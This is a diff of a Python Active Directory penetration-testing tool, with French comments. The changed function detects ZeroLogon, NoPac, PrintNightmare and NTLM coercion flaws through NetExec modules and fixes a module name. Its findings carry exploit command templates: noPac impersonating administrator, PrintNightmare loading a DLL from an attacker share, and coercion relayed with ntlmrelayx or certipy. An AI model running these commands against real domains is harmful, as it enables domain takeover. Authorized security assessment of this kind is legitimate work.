@@ -1666,7 +1666,9 @@ def mitm6_responder_hint(state):
 
 def cve_checks(args, state, dc, authed=False):
     """DETECTION SEULE (jamais d'auto-exploit, meme sous --exploit) via modules nxc :
-    ZeroLogon (non-auth), NoPac / PrintNightmare / PetitPotam (auth)."""
+    ZeroLogon (non-auth), NoPac / PrintNightmare / coerce_plus (auth).
+    NB module de coercion NetExec = 'coerce_plus' (PetitPotam/DFSCoerce/PrinterBug/
+    ShadowCoerce/MSEven regroupes) - PAS 'petitpotam' (n'existe pas)."""
     nxc = nxc_bin()
     if not (nxc and dc):
         return
@@ -1676,20 +1678,27 @@ def cve_checks(args, state, dc, authed=False):
         checks += [
             ("nopac", "CRIT", True, "CVE-2021-42278/42287 -> DA quasi direct"),
             ("printnightmare", "HIGH", True, "CVE-2021-34527 RCE spooler"),
-            ("petitpotam", "HIGH", True, "coercion MS-EFSRPC -> relais ntlmrelayx / ADCS ESC8"),
+            ("coerce_plus", "HIGH", True,
+             "coercion (PetitPotam/DFSCoerce/PrinterBug/ShadowCoerce) -> relais ADCS ESC8"),
         ]
     cmds = {
         "zerologon": f"python3 zerologon_tester.py <DC_HOST> {dc}   # check (exploit = cve-2020-1472, JAMAIS en prod)",
         "nopac": f"python3 noPac.py {args.domain}/{args.user}:<pass> -dc-ip {dc} -dc-host <DC_HOST> --impersonate administrator -use-ldap -shell",
         "printnightmare": f"python3 CVE-2021-1675.py {args.domain}/{args.user}:<pass>@{dc} '\\\\<ATTACKER>\\share\\payload.dll'",
-        "petitpotam": f"python3 PetitPotam.py -u {args.user} -p <pass> <ATTACKER> {dc}   (+ ntlmrelayx en ecoute)",
+        "coerce_plus": (f"nxc smb {dc} -u {args.user} -p <pass> -M coerce_plus -o LISTENER=<ATTACKER>   "
+                        f"# + ntlmrelayx.py -t ldap://{dc} --shadow-credentials  OU  certipy relay (ESC8)"),
     }
     for mod, sev, need_auth, note in checks:
         auth = nxc_auth(args) if need_auth else nxc_auth(args, null=True)
         rc, out, _ = run_cmd([nxc, "smb", dc] + auth +
                              (["-d", args.domain] if (need_auth and args.domain) else []) +
                              ["-M", mod], 90)
-        if re.search(r"VULNERABLE|is vulnerable|may be vulnerable", out, re.I):
+        # garde-fou : un module absent/mal nomme ne doit PAS passer pour "non vulnerable"
+        if re.search(r"module.*(not found|does not exist|no module|unknown)|no module named", out, re.I):
+            dbg(f"[!] cve_checks: module nxc '{mod}' introuvable dans cette version "
+                f"(faux negatif evite) -> verifie 'nxc -L | grep {mod}'")
+            continue
+        if re.search(r"VULNERABLE|is vulnerable|may be vulnerable|coerc\w* (ok|success|worked)", out, re.I):
             add_finding(state, sev, f"{mod.upper()} : cible potentiellement VULNERABLE",
                         f"{note} | {cmds.get(mod, mod)}", dc)
 
